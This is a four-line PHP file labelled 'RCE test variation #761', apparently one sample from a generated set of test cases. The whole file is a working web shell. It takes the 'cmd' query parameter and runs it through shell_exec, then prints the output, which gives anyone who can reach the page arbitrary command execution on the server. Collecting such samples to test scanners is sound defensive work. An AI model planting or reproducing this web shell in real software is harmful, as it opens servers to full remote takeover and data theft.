<?php
// RCE test variation #761
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>